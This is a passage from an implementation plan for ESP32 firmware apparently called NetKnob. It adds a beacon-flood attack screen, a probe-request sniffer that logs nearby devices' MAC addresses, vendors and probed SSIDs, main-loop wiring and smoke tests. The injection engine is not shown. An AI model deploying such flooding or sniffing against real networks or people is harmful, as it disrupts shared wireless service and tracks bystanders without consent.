            lv_obj_clear_flag(lbl_comp_dur, LV_OBJ_FLAG_HIDDEN);
            lv_obj_clear_flag(lbl_comp_total, LV_OBJ_FLAG_HIDDEN);
            lv_obj_clear_flag(lbl_comp_rate, LV_OBJ_FLAG_HIDDEN);
            lv_obj_clear_flag(lbl_comp_hint, LV_OBJ_FLAG_HIDDEN);
            update_complete_display();
            break;
    }
}

// ---------------------------------------------------------------------------
// ScreenDef lifecycle
// ---------------------------------------------------------------------------
static void create() {
    scr_root = lv_obj_create(NULL);
    lv_obj_set_style_bg_color(scr_root, COL_BG, 0);
    lv_obj_set_style_bg_opa(scr_root, LV_OPA_COVER, 0);
}

static void show() {
    AttackState* as = attack_get_state();
    // Enter CONFIG if not already in an attack
    if (as->phase == ATTACK_IDLE || as->type != ATTACK_BEACON_FLOOD) {
        attack_start(ATTACK_BEACON_FLOOD);
        param_cursor = 0;
    }
    show_phase_view();
    lv_screen_load(scr_root);
}

static void hide() {}

static AttackPhase last_shown_phase = ATTACK_IDLE;

static void update() {
    AttackState* as = attack_get_state();

    // Detect phase transitions
    if (as->phase != last_shown_phase) {
        last_shown_phase = as->phase;

        if (as->phase == ATTACK_RUNNING) {
            haptic_play(16);  // Triple click
        } else if (as->phase == ATTACK_COMPLETE) {
            wifi_attack_stop();
            haptic_play(14);  // Pulsing
        }

        show_phase_view();
    }

    // Live stats update during RUNNING (every 500ms)
    if (as->phase == ATTACK_RUNNING) {
        uint32_t now = millis();
        if (now - last_ui_update >= 500) {
            last_ui_update = now;
            update_running_display();
            lv_refr_now(display_get_disp());
        }
    }
}

// ---------------------------------------------------------------------------
// Input handlers
// ---------------------------------------------------------------------------
void scr_beacon_flood_on_encoder(int8_t delta) {
    AttackState* as = attack_get_state();
    if (as->phase != ATTACK_CONFIG) return;

    switch (param_cursor) {
        case 0: { // SSID count
            int16_t v = as->ssid_count + delta;
            if (v < 1) v = 1;
            if (v > BEACON_MAX_SSIDS) v = BEACON_MAX_SSIDS;
            as->ssid_count = v;
            break;
        }
        case 1: { // Source mode
            int8_t v = as->ssid_source + (delta > 0 ? 1 : -1);
            if (v < 0) v = 2;
            if (v > 2) v = 0;
            as->ssid_source = v;
            break;
        }
        case 2: { // TX rate
            int16_t v = as->tx_rate + delta * 5;
            if (v < 1) v = 1;
            if (v > 100) v = 100;
            as->tx_rate = v;
            break;
        }
        case 3: { // Duration
            int16_t v = as->duration_sec + delta * 5;
            if (v < 0) v = 0;
            if (v > 300) v = 300;
            as->duration_sec = v;
            break;
        }
    }

    update_config_display();
    haptic_click();
    lv_refr_now(display_get_disp());
}

void scr_beacon_flood_on_tap() {
    AttackState* as = attack_get_state();

    if (as->phase == ATTACK_CONFIG) {
        // Cycle to next parameter
        param_cursor = (param_cursor + 1) % 4;
        update_config_display();
        haptic_click();
        lv_refr_now(display_get_disp());
    } else if (as->phase == ATTACK_COMPLETE) {
        // Dismiss → back to CONFIG
        attack_start(ATTACK_BEACON_FLOOD);
        param_cursor = 0;
        show_phase_view();
        lv_refr_now(display_get_disp());
    }
}

void scr_beacon_flood_on_hold() {
    AttackState* as = attack_get_state();

    if (as->phase == ATTACK_CONFIG) {
        // Start attack
        wifi_attack_start_beacon_flood();
        attack_confirm();
        show_phase_view();
        lv_refr_now(display_get_disp());
    } else if (as->phase == ATTACK_RUNNING) {
        // Manual stop
        attack_stop();
        wifi_attack_stop();
    } else if (as->phase == ATTACK_COMPLETE) {
        // Run again
        wifi_attack_start_beacon_flood();
        attack_confirm();
        show_phase_view();
        lv_refr_now(display_get_disp());
    }
}

// ---------------------------------------------------------------------------
// ScreenDef
// ---------------------------------------------------------------------------
const ScreenDef scr_beacon_flood_def = {
    .name = "Beacon Flood",
    .group = GROUP_WIFI,
    .id = SCREEN_BEACON_FLOOD,
    .create = create,
    .show = show,
    .hide = hide,
    .destroy = NULL,
    .update = update,
    .enc_mode = ENC_ATTACK_PARAM
};
```

- [ ] **Step 3: Verify it compiles**

Run: `cd C:/Users/roarh/Documents/code/NetKnob/NetKnob && pio run`
Expected: SUCCESS

- [ ] **Step 4: Commit**

---

### Task 5: Probe Sniffer Module

**Files:**
- Create: `src/wifi_probe_sniffer.h`
- Create: `src/wifi_probe_sniffer.cpp`
- Modify: `src/wifi_scanner.cpp`

- [ ] **Step 1: Create `src/wifi_probe_sniffer.h`**

```cpp
#pragma once

#include <stdint.h>

#define PROBE_BUFFER_SIZE        100
#define PROBE_MAC_RANDOMIZED_BIT 0x02

struct ProbeRequest {
    uint8_t  src_mac[6];
    char     ssid_probed[33];
    int8_t   rssi;
    uint32_t timestamp_ms;
    uint8_t  channel;
    bool     mac_randomized;
};

struct ProbeSnifferState {
    ProbeRequest probes[PROBE_BUFFER_SIZE];
    uint16_t     write_index;
    uint16_t     total_count;
    uint8_t      unique_macs;
    uint8_t      unique_ssids;
    bool         running;
    bool         channel_hop;
};

void probe_sniffer_init();
void probe_sniffer_start();
void probe_sniffer_stop();
void probe_sniffer_update();
ProbeSnifferState* probe_sniffer_get_state();

// Called from wifi_scanner promiscuous callback — ISR-safe
void probe_sniffer_on_frame(const uint8_t* frame, uint16_t len, int8_t rssi, uint8_t channel);
```

- [ ] **Step 2: Create `src/wifi_probe_sniffer.cpp`**

```cpp
#include "wifi_probe_sniffer.h"
#include <Arduino.h>
#include <string.h>

// ---------------------------------------------------------------------------
// Ring buffer for ISR → main loop transfer
// ---------------------------------------------------------------------------
#define PROBE_RING_SLOTS 8
#define PROBE_RING_BUF_SIZE 128

struct ProbeRingSlot {
    uint8_t  data[PROBE_RING_BUF_SIZE];
    uint16_t len;
    int8_t   rssi;
    uint8_t  channel;
};

static ProbeRingSlot  probe_ring[PROBE_RING_SLOTS];
static volatile uint8_t probe_ring_head = 0;
static volatile uint8_t probe_ring_tail = 0;
static portMUX_TYPE probe_ring_mux = portMUX_INITIALIZER_UNLOCKED;

// ---------------------------------------------------------------------------
// State
// ---------------------------------------------------------------------------
static ProbeSnifferState state;

// ---------------------------------------------------------------------------
// Track unique MACs and SSIDs (simple linear scan — sufficient for 100 entries)
// ---------------------------------------------------------------------------
static void recount_uniques() {
    uint8_t mac_count = 0;
    uint8_t ssid_count = 0;

    // Count unique MACs (brute force O(n^2) — fine for 100 entries)
    uint16_t count = (state.total_count < PROBE_BUFFER_SIZE) ? state.total_count : PROBE_BUFFER_SIZE;
    for (uint16_t i = 0; i < count; i++) {
        bool mac_seen = false;
        bool ssid_seen = false;
        for (uint16_t j = 0; j < i; j++) {
            if (memcmp(state.probes[i].src_mac, state.probes[j].src_mac, 6) == 0)
                mac_seen = true;
            if (strlen(state.probes[i].ssid_probed) > 0 &&
                strcmp(state.probes[i].ssid_probed, state.probes[j].ssid_probed) == 0)
                ssid_seen = true;
        }
        if (!mac_seen) mac_count++;
        if (!ssid_seen && strlen(state.probes[i].ssid_probed) > 0) ssid_count++;
    }

    state.unique_macs = mac_count;
    state.unique_ssids = ssid_count;
}

// ---------------------------------------------------------------------------
// Parse a probe request frame
// ---------------------------------------------------------------------------
static void parse_probe_request(const uint8_t* frame, uint16_t len, int8_t rssi, uint8_t channel) {
    if (len < 24) return;  // Need at least MAC header

    ProbeRequest pr;
    memset(&pr, 0, sizeof(pr));

    // Source MAC at bytes 10-15
    memcpy(pr.src_mac, &frame[10], 6);
    pr.rssi = rssi;
    pr.timestamp_ms = millis();
    pr.channel = channel;
    pr.mac_randomized = (pr.src_mac[0] & PROBE_MAC_RANDOMIZED_BIT) != 0;

    // Walk tagged IEs for SSID (tag 0)
    uint16_t pos = 24;  // After MAC header (no fixed body for probe request)
    pr.ssid_probed[0] = '\0';

    while (pos + 2 <= len) {
        uint8_t tag_id  = frame[pos];
        uint8_t tag_len = frame[pos + 1];
        if (pos + 2 + tag_len > len) break;

        if (tag_id == 0) {  // SSID
            if (tag_len > 0 && tag_len <= 32) {
                memcpy(pr.ssid_probed, &frame[pos + 2], tag_len);
                pr.ssid_probed[tag_len] = '\0';
            }
            break;  // Found SSID, done
        }
        pos += 2 + tag_len;
    }

    // Write to circular buffer
    state.probes[state.write_index] = pr;
    state.write_index = (state.write_index + 1) % PROBE_BUFFER_SIZE;
    state.total_count++;
}

// ---------------------------------------------------------------------------
// Public API
// ---------------------------------------------------------------------------
void probe_sniffer_init() {
    memset(&state, 0, sizeof(state));
    state.running = false;
    state.channel_hop = true;
}

void probe_sniffer_start() {
    state.running = true;
    Serial.println("[probe] sniffer started");
}

void probe_sniffer_stop() {
    state.running = false;
    Serial.println("[probe] sniffer stopped");
}

void probe_sniffer_update() {
    if (!state.running) return;

    // Drain ring buffer
    while (true) {
        portENTER_CRITICAL(&probe_ring_mux);
        bool has_data = (probe_ring_tail != probe_ring_head);
        ProbeRingSlot slot;
        if (has_data) {
            slot = probe_ring[probe_ring_tail];
            probe_ring_tail = (probe_ring_tail + 1) % PROBE_RING_SLOTS;
        }
        portEXIT_CRITICAL(&probe_ring_mux);

        if (!has_data) break;
        parse_probe_request(slot.data, slot.len, slot.rssi, slot.channel);
    }

    // Recount uniques periodically (every 50 new probes)
    static uint16_t last_recount = 0;
    if (state.total_count - last_recount >= 50 || state.total_count < 50) {
        recount_uniques();
        last_recount = state.total_count;
    }
}

ProbeSnifferState* probe_sniffer_get_state() {
    return &state;
}

// Called from ISR context (promiscuous callback)
void probe_sniffer_on_frame(const uint8_t* frame, uint16_t len, int8_t rssi, uint8_t channel) {
    if (!state.running) return;

    portENTER_CRITICAL(&probe_ring_mux);
    uint8_t next_head = (probe_ring_head + 1) % PROBE_RING_SLOTS;
    if (next_head != probe_ring_tail) {
        uint16_t copy_len = (len > PROBE_RING_BUF_SIZE) ? PROBE_RING_BUF_SIZE : len;
        memcpy(probe_ring[probe_ring_head].data, frame, copy_len);
        probe_ring[probe_ring_head].len = copy_len;
        probe_ring[probe_ring_head].rssi = rssi;
        probe_ring[probe_ring_head].channel = channel;
        probe_ring_head = next_head;
    }
    portEXIT_CRITICAL(&probe_ring_mux);
}
```

- [ ] **Step 3: Extend promiscuous callback in `src/wifi_scanner.cpp`**

Add include at top:
```cpp
#include "wifi_probe_sniffer.h"
```

In `promisc_callback()`, BEFORE the line `uint8_t fc0 = frame[0];`, add a probe request forwarding check. The existing code filters for `fc0 == 0x80` (beacon) and `fc0 == 0x50` (probe response). Add:

```cpp
    // Forward probe requests to sniffer (subtype 0x04 → frame control byte 0x40)
    if (fc0 == 0x40) {
        probe_sniffer_on_frame(frame, frame_len, pkt->rx_ctrl.rssi,
                               pkt->rx_ctrl.channel);
        return;  // Don't process as scanner data
    }
```

Insert this right after the `if (frame_len < 36) return;` check and before the `uint8_t fc0 = frame[0];` line. Actually, we need to read fc0 first. So the change is:

After line `uint8_t fc0 = frame[0];` (which is line 79 in the current file), and before the existing check `if (fc0 != 0x80 && fc0 != 0x50) return;`, insert:

```cpp
    // Forward probe requests to sniffer
    if (fc0 == 0x40) {
        probe_sniffer_on_frame(frame, frame_len, pkt->rx_ctrl.rssi, 0);
        return;
    }
```

Note: the channel is passed as 0 here since `rx_ctrl` doesn't always have a reliable channel field in promiscuous mode. The sniffer can use the scanner's `current_channel` instead. Update the call to:

```cpp
        probe_sniffer_on_frame(frame, frame_len, pkt->rx_ctrl.rssi,
                               pkt->rx_ctrl.channel);
```

The `rx_ctrl.channel` field is available and accurate in promiscuous mode.

- [ ] **Step 4: Verify it compiles**

Run: `cd C:/Users/roarh/Documents/code/NetKnob/NetKnob && pio run`
Expected: SUCCESS

- [ ] **Step 5: Commit**

---

### Task 6: Probe Sniffer Screen

**Files:**
- Create: `src/screens/scr_probe_sniff.h`
- Create: `src/screens/scr_probe_sniff.cpp`

- [ ] **Step 1: Create `src/screens/scr_probe_sniff.h`**

```cpp
#pragma once

#include "navigation.h"

extern const ScreenDef scr_probe_sniff_def;

void scr_probe_sniff_on_encoder(int8_t delta);
void scr_probe_sniff_on_tap();
void scr_probe_sniff_on_hold();
```

- [ ] **Step 2: Create `src/screens/scr_probe_sniff.cpp`**

```cpp
#include "scr_probe_sniff.h"
#include "display.h"
#include "haptic.h"
#include "wifi_probe_sniffer.h"
#include "wifi_scanner.h"
#include <Arduino.h>
#include <lvgl.h>
#include <string.h>
#include <stdio.h>

// ---------------------------------------------------------------------------
// LVGL objects
// ---------------------------------------------------------------------------
static lv_obj_t* scr_root = NULL;

// List view
#define VISIBLE_PROBE_ROWS 7
static lv_obj_t* lbl_status    = NULL;
static lv_obj_t* lbl_stats     = NULL;
static lv_obj_t* lbl_probes[VISIBLE_PROBE_ROWS] = {};
static lv_obj_t* lbl_footer    = NULL;
static uint8_t   scroll_offset = 0;
static int8_t    selected_idx  = -1;  // -1 = none selected

// Detail view
static lv_obj_t* lbl_det_mac     = NULL;
static lv_obj_t* lbl_det_type    = NULL;
static lv_obj_t* lbl_det_vendor  = NULL;
static lv_obj_t* lbl_det_ssids   = NULL;
static lv_obj_t* lbl_det_rssi    = NULL;
static lv_obj_t* lbl_det_count   = NULL;
static lv_obj_t* lbl_det_hint    = NULL;

static bool list_built   = false;
static bool detail_built = false;
static bool showing_detail = false;
static uint32_t last_ui_update = 0;

// ---------------------------------------------------------------------------
// Build list view
// ---------------------------------------------------------------------------
static void build_list_view() {
    if (list_built) return;

    lbl_status = lv_label_create(scr_root);
    lv_obj_set_style_text_font(lbl_status, &lv_font_montserrat_14, 0);
    lv_obj_set_style_text_color(lbl_status, COL_CYAN, 0);
    lv_obj_align(lbl_status, LV_ALIGN_TOP_MID, 0, 30);

    lbl_stats = lv_label_create(scr_root);
    lv_obj_set_style_text_font(lbl_stats, &lv_font_montserrat_12, 0);
    lv_obj_set_style_text_color(lbl_stats, COL_GRAY, 0);
    lv_obj_align(lbl_stats, LV_ALIGN_TOP_MID, 0, 52);

    for (int i = 0; i < VISIBLE_PROBE_ROWS; i++) {
        lbl_probes[i] = lv_label_create(scr_root);
        lv_obj_set_style_text_font(lbl_probes[i], &lv_font_montserrat_14, 0);
        lv_obj_align(lbl_probes[i], LV_ALIGN_TOP_LEFT, 20, 75 + i * 28);
        lv_label_set_long_mode(lbl_probes[i], LV_LABEL_LONG_CLIP);
        lv_obj_set_width(lbl_probes[i], 300);
    }

    lbl_footer = lv_label_create(scr_root);
    lv_label_set_text(lbl_footer, "dial=CH  tap=select");
    lv_obj_set_style_text_font(lbl_footer, &lv_font_montserrat_12, 0);
    lv_obj_set_style_text_color(lbl_footer, COL_GRAY, 0);
    lv_obj_align(lbl_footer, LV_ALIGN_BOTTOM_MID, 0, -35);

    list_built = true;
}

// ---------------------------------------------------------------------------
// Build detail view
// ---------------------------------------------------------------------------
static void build_detail_view() {
    if (detail_built) return;

    lbl_det_mac = lv_label_create(scr_root);
    lv_obj_set_style_text_font(lbl_det_mac, &lv_font_montserrat_16, 0);
    lv_obj_set_style_text_color(lbl_det_mac, COL_CYAN, 0);
    lv_obj_align(lbl_det_mac, LV_ALIGN_TOP_MID, 0, 40);

    lbl_det_type = lv_label_create(scr_root);
    lv_obj_set_style_text_font(lbl_det_type, &lv_font_montserrat_14, 0);
    lv_obj_set_style_text_color(lbl_det_type, COL_WHITE, 0);
    lv_obj_align(lbl_det_type, LV_ALIGN_TOP_LEFT, 30, 75);

    lbl_det_vendor = lv_label_create(scr_root);
    lv_obj_set_style_text_font(lbl_det_vendor, &lv_font_montserrat_14, 0);
    lv_obj_set_style_text_color(lbl_det_vendor, COL_WHITE, 0);
    lv_obj_align(lbl_det_vendor, LV_ALIGN_TOP_LEFT, 30, 100);

    lbl_det_ssids = lv_label_create(scr_root);
    lv_obj_set_style_text_font(lbl_det_ssids, &lv_font_montserrat_14, 0);
    lv_obj_set_style_text_color(lbl_det_ssids, COL_GREEN, 0);
    lv_obj_align(lbl_det_ssids, LV_ALIGN_TOP_LEFT, 30, 135);
    lv_label_set_long_mode(lbl_det_ssids, LV_LABEL_LONG_WRAP);
    lv_obj_set_width(lbl_det_ssids, 280);

    lbl_det_rssi = lv_label_create(scr_root);
    lv_obj_set_style_text_font(lbl_det_rssi, &lv_font_montserrat_14, 0);
    lv_obj_set_style_text_color(lbl_det_rssi, COL_WHITE, 0);
    lv_obj_align(lbl_det_rssi, LV_ALIGN_TOP_LEFT, 30, 230);

    lbl_det_count = lv_label_create(scr_root);
    lv_obj_set_style_text_font(lbl_det_count, &lv_font_montserrat_14, 0);
    lv_obj_set_style_text_color(lbl_det_count, COL_WHITE, 0);
    lv_obj_align(lbl_det_count, LV_ALIGN_TOP_LEFT, 30, 255);

    lbl_det_hint = lv_label_create(scr_root);
    lv_label_set_text(lbl_det_hint, "tap = back");
    lv_obj_set_style_text_font(lbl_det_hint, &lv_font_montserrat_12, 0);
    lv_obj_set_style_text_color(lbl_det_hint, COL_GRAY, 0);
    lv_obj_align(lbl_det_hint, LV_ALIGN_BOTTOM_MID, 0, -35);

    detail_built = true;
}

// ---------------------------------------------------------------------------
// Update list display
// ---------------------------------------------------------------------------
static void update_list_display() {
    ProbeSnifferState* ps = probe_sniffer_get_state();
    WifiScannerState* ws = scanner_get_state();
    char buf[64];

    // Status bar
    snprintf(buf, sizeof(buf), "PROBE SNIFFER  CH %d", ws->current_channel);
    lv_label_set_text(lbl_status, buf);

    snprintf(buf, sizeof(buf), "Probes: %u | Devs: %u | SSIDs: %u",
             ps->total_count, ps->unique_macs, ps->unique_ssids);
    lv_label_set_text(lbl_stats, buf);

    // Probe list (newest first)
    uint16_t count = (ps->total_count < PROBE_BUFFER_SIZE) ? ps->total_count : PROBE_BUFFER_SIZE;

    for (int i = 0; i < VISIBLE_PROBE_ROWS; i++) {
        int probe_idx_from_newest = scroll_offset + i;
        if (probe_idx_from_newest >= (int)count) {
            lv_label_set_text(lbl_probes[i], "");
            continue;
        }

        // Calculate actual buffer index (newest first)
        int buf_idx = ((int)ps->write_index - 1 - probe_idx_from_newest + PROBE_BUFFER_SIZE) % PROBE_BUFFER_SIZE;
        ProbeRequest* pr = &ps->probes[buf_idx];

        // Format: MAC:* → SSID
        const char* ssid = strlen(pr->ssid_probed) > 0 ? pr->ssid_probed : "(broadcast)";
        snprintf(buf, sizeof(buf), "%s%02X:%02X:%02X:* > %s",
                 (probe_idx_from_newest == selected_idx) ? "> " : "  ",
                 pr->src_mac[0], pr->src_mac[1], pr->src_mac[2],
                 ssid);
        lv_label_set_text(lbl_probes[i], buf);

        // Color: selected = cyan, randomized = dim, normal = white
        if (probe_idx_from_newest == selected_idx) {
            lv_obj_set_style_text_color(lbl_probes[i], COL_CYAN, 0);
        } else if (pr->mac_randomized) {
            lv_obj_set_style_text_color(lbl_probes[i], COL_GRAY, 0);
        } else {
            lv_obj_set_style_text_color(lbl_probes[i], COL_WHITE, 0);
        }
    }
}

// ---------------------------------------------------------------------------
// Update detail display
// ---------------------------------------------------------------------------
static void update_detail_display() {
    ProbeSnifferState* ps = probe_sniffer_get_state();
    if (selected_idx < 0) return;

    uint16_t count = (ps->total_count < PROBE_BUFFER_SIZE) ? ps->total_count : PROBE_BUFFER_SIZE;
    if (selected_idx >= (int)count) return;

    int buf_idx = ((int)ps->write_index - 1 - selected_idx + PROBE_BUFFER_SIZE) % PROBE_BUFFER_SIZE;
    ProbeRequest* pr = &ps->probes[buf_idx];

    char buf[128];

    // Full MAC
    snprintf(buf, sizeof(buf), "%02X:%02X:%02X:%02X:%02X:%02X",
             pr->src_mac[0], pr->src_mac[1], pr->src_mac[2],
             pr->src_mac[3], pr->src_mac[4], pr->src_mac[5]);
    lv_label_set_text(lbl_det_mac, buf);

    // Type
    lv_label_set_text(lbl_det_type, pr->mac_randomized ? "Type: Randomized" : "Type: Real (OUI)");

    // Vendor
    if (!pr->mac_randomized) {
        snprintf(buf, sizeof(buf), "Vendor: %s", oui_lookup(pr->src_mac));
    } else {
        snprintf(buf, sizeof(buf), "Vendor: --");
    }
    lv_label_set_text(lbl_det_vendor, buf);

    // Collect all SSIDs from this MAC
    char ssids_buf[256] = "Probing:\n";
    uint8_t ssid_lines = 0;
    for (uint16_t i = 0; i < count && ssid_lines < 5; i++) {
        if (memcmp(ps->probes[i].src_mac, pr->src_mac, 6) == 0 &&
            strlen(ps->probes[i].ssid_probed) > 0) {
            // Check if already listed
            bool dup = false;
            // Simple substring check in what we've built so far
            if (strstr(ssids_buf, ps->probes[i].ssid_probed)) dup = true;
            if (!dup) {
                strncat(ssids_buf, "  ", sizeof(ssids_buf) - strlen(ssids_buf) - 1);
                strncat(ssids_buf, ps->probes[i].ssid_probed, sizeof(ssids_buf) - strlen(ssids_buf) - 1);
                strncat(ssids_buf, "\n", sizeof(ssids_buf) - strlen(ssids_buf) - 1);
                ssid_lines++;
            }
        }
    }
    if (ssid_lines == 0) strncat(ssids_buf, "  (broadcast only)\n", sizeof(ssids_buf) - strlen(ssids_buf) - 1);
    lv_label_set_text(lbl_det_ssids, ssids_buf);

    // RSSI
    snprintf(buf, sizeof(buf), "RSSI: %d dBm", pr->rssi);
    lv_label_set_text(lbl_det_rssi, buf);

    // Count probes from this MAC
    uint16_t mac_count = 0;
    for (uint16_t i = 0; i < count; i++) {
        if (memcmp(ps->probes[i].src_mac, pr->src_mac, 6) == 0) mac_count++;
    }
    snprintf(buf, sizeof(buf), "Probes: %u", mac_count);
    lv_label_set_text(lbl_det_count, buf);
}

// ---------------------------------------------------------------------------
// Show/hide views
// ---------------------------------------------------------------------------
static void show_list() {
    build_list_view();
    lv_obj_clear_flag(lbl_status, LV_OBJ_FLAG_HIDDEN);
    lv_obj_clear_flag(lbl_stats, LV_OBJ_FLAG_HIDDEN);
    for (int i = 0; i < VISIBLE_PROBE_ROWS; i++) lv_obj_clear_flag(lbl_probes[i], LV_OBJ_FLAG_HIDDEN);
    lv_obj_clear_flag(lbl_footer, LV_OBJ_FLAG_HIDDEN);

    if (detail_built) {
        lv_obj_add_flag(lbl_det_mac, LV_OBJ_FLAG_HIDDEN);
        lv_obj_add_flag(lbl_det_type, LV_OBJ_FLAG_HIDDEN);
        lv_obj_add_flag(lbl_det_vendor, LV_OBJ_FLAG_HIDDEN);
        lv_obj_add_flag(lbl_det_ssids, LV_OBJ_FLAG_HIDDEN);
        lv_obj_add_flag(lbl_det_rssi, LV_OBJ_FLAG_HIDDEN);
        lv_obj_add_flag(lbl_det_count, LV_OBJ_FLAG_HIDDEN);
        lv_obj_add_flag(lbl_det_hint, LV_OBJ_FLAG_HIDDEN);
    }

    showing_detail = false;
    update_list_display();
}

static void show_detail() {
    build_detail_view();
    lv_obj_add_flag(lbl_status, LV_OBJ_FLAG_HIDDEN);
    lv_obj_add_flag(lbl_stats, LV_OBJ_FLAG_HIDDEN);
    for (int i = 0; i < VISIBLE_PROBE_ROWS; i++) lv_obj_add_flag(lbl_probes[i], LV_OBJ_FLAG_HIDDEN);
    lv_obj_add_flag(lbl_footer, LV_OBJ_FLAG_HIDDEN);

    lv_obj_clear_flag(lbl_det_mac, LV_OBJ_FLAG_HIDDEN);
    lv_obj_clear_flag(lbl_det_type, LV_OBJ_FLAG_HIDDEN);
    lv_obj_clear_flag(lbl_det_vendor, LV_OBJ_FLAG_HIDDEN);
    lv_obj_clear_flag(lbl_det_ssids, LV_OBJ_FLAG_HIDDEN);
    lv_obj_clear_flag(lbl_det_rssi, LV_OBJ_FLAG_HIDDEN);
    lv_obj_clear_flag(lbl_det_count, LV_OBJ_FLAG_HIDDEN);
    lv_obj_clear_flag(lbl_det_hint, LV_OBJ_FLAG_HIDDEN);

    showing_detail = true;
    update_detail_display();
}

// ---------------------------------------------------------------------------
// ScreenDef lifecycle
// ---------------------------------------------------------------------------
static void create() {
    scr_root = lv_obj_create(NULL);
    lv_obj_set_style_bg_color(scr_root, COL_BG, 0);
    lv_obj_set_style_bg_opa(scr_root, LV_OPA_COVER, 0);
}

static void show_screen() {
    probe_sniffer_start();
    scroll_offset = 0;
    selected_idx = -1;
    showing_detail = false;
    show_list();
    lv_screen_load(scr_root);
}

static void hide() {
    probe_sniffer_stop();
}

static void update_screen() {
    if (showing_detail) return;  // Don't auto-refresh detail view

    uint32_t now = millis();
    if (now - last_ui_update >= 500) {
        last_ui_update = now;
        update_list_display();
        lv_refr_now(display_get_disp());
    }
}

// ---------------------------------------------------------------------------
// Input handlers
// ---------------------------------------------------------------------------
void scr_probe_sniff_on_encoder(int8_t delta) {
    if (showing_detail) return;

    // Hop channel (same as WiFi scanner)
    WifiScannerState* ws = scanner_get_state();
    int8_t ch = ws->current_channel + delta;
    if (ch < CHANNEL_MIN) ch = CHANNEL_MAX;
    if (ch > CHANNEL_MAX) ch = CHANNEL_MIN;
    scanner_set_channel(ch);
    haptic_click();
    update_list_display();
    lv_refr_now(display_get_disp());
}

void scr_probe_sniff_on_tap() {
    if (showing_detail) {
        // Back to list
        show_list();
        lv_refr_now(display_get_disp());
        return;
    }

    // Select/deselect entry
    ProbeSnifferState* ps = probe_sniffer_get_state();
    uint16_t count = (ps->total_count < PROBE_BUFFER_SIZE) ? ps->total_count : PROBE_BUFFER_SIZE;
    if (count == 0) return;

    if (selected_idx < 0) {
        selected_idx = scroll_offset;  // Select first visible
    } else {
        selected_idx++;
        if (selected_idx >= (int)count) selected_idx = 0;
    }
    haptic_click();
    update_list_display();
    lv_refr_now(display_get_disp());
}

void scr_probe_sniff_on_hold() {
    if (showing_detail) return;
    if (selected_idx < 0) return;

    // Show detail for selected entry
    haptic_double_click();
    show_detail();
    lv_refr_now(display_get_disp());
}

// ---------------------------------------------------------------------------
// ScreenDef
// ---------------------------------------------------------------------------
const ScreenDef scr_probe_sniff_def = {
    .name = "Probe Sniffer",
    .group = GROUP_WIFI,
    .id = SCREEN_PROBE_SNIFF,
    .create = create,
    .show = show_screen,
    .hide = hide,
    .destroy = NULL,
    .update = update_screen,
    .enc_mode = ENC_CHANNEL_HOP
};
```

- [ ] **Step 3: Verify it compiles**

Run: `cd C:/Users/roarh/Documents/code/NetKnob/NetKnob && pio run`
Expected: SUCCESS

- [ ] **Step 4: Commit**

---

### Task 7: Main Loop Integration

**Files:**
- Modify: `src/main.cpp`

- [ ] **Step 1: Add includes**

After the existing screen includes (line 25, after `#include "screens/scr_safe_lock.h"`), add:

```cpp
#include "attack_common.h"
#include "wifi_attack.h"
#include "wifi_probe_sniffer.h"
#include "screens/scr_beacon_flood.h"
#include "screens/scr_probe_sniff.h"
```

- [ ] **Step 2: Add init calls in `setup()`**

After `safe_lock_init();` (line 56) and before `display_animate_splash(...)`, add:

```cpp
    attack_init();
    wifi_attack_init();
    probe_sniffer_init();
```

After `navigation_register_screen(&scr_safe_lock_def);` (line 68), add:

```cpp
    navigation_register_screen(&scr_beacon_flood_def);
    navigation_register_screen(&scr_probe_sniff_def);
```

- [ ] **Step 3: Add encoder routing**

In the encoder switch (around line 103), add before `default: break;`:

```cpp
                case SCREEN_BEACON_FLOOD:
                    scr_beacon_flood_on_encoder(delta);
                    break;
                case SCREEN_PROBE_SNIFF:
                    scr_probe_sniff_on_encoder(delta);
                    break;
```

- [ ] **Step 4: Add touch tap routing**

In the touch tap switch (around line 130), add before `default: break;`:

```cpp
                case SCREEN_BEACON_FLOOD:
                    scr_beacon_flood_on_tap();
                    break;
                case SCREEN_PROBE_SNIFF:
                    scr_probe_sniff_on_tap();
                    break;
```

- [ ] **Step 5: Add touch hold routing**

In the touch hold switch (around line 155), add before `default: break;`:

```cpp
                case SCREEN_BEACON_FLOOD:
                    scr_beacon_flood_on_hold();
                    break;
                case SCREEN_PROBE_SNIFF:
                    scr_probe_sniff_on_hold();
                    break;
```

- [ ] **Step 6: Add update calls**

After `navigation_update();` (line 168) and before `lv_timer_handler();`, add:

```cpp
    // Phase 3: attack engine updates (run regardless of active screen)
    attack_update();
    wifi_attack_update();
    probe_sniffer_update();
```

- [ ] **Step 7: Verify it compiles and flash**

Run: `cd C:/Users/roarh/Documents/code/NetKnob/NetKnob && pio run`
Expected: SUCCESS

- [ ] **Step 8: Commit**

---

### Task 8: Restore Main Firmware + Smoke Test

**Files:** None (testing only)

- [ ] **Step 1: Flash the main firmware**

Run: `cd C:/Users/roarh/Documents/code/NetKnob/NetKnob && pio run -t upload`

Note: This flashes the main NetKnob firmware (not the spike). The spike firmware will be overwritten.

- [ ] **Step 2: Verify boot and navigation**

Open serial monitor. Expected:
- NetKnob boots normally
- WiFi scanner works
- WiFi group menu now shows 3 items: Scanner, Beacon Flood, Probe Sniffer
- Navigating to Beacon Flood shows config screen
- Navigating to Probe Sniffer shows live probe list
- Backspin returns to menu
- Shake returns to main menu

- [ ] **Step 3: Test beacon flood end-to-end**

1. Navigate to Beacon Flood
2. Adjust SSID count with encoder
3. Tap to cycle parameters
4. Hold to start attack
5. Check phone WiFi list for fake SSIDs
6. Hold to stop, verify results screen
7. Tap to dismiss

- [ ] **Step 4: Test probe sniffer**

1. Navigate to Probe Sniffer
2. Watch probes appear in real-time
3. Rotate encoder to hop channels
4. Tap to select an entry
5. Hold to see detail view
6. Tap to return to list

- [ ] **Step 5: Test emergency stop**

1. Start beacon flood
2. Shake device — attack should stop immediately, return to main menu
3. Start beacon flood again
4. Backspin — should go to menu, attack continues in background
5. Navigate back to Beacon Flood — stats should still be updating

- [ ] **Step 6: Commit if stable**
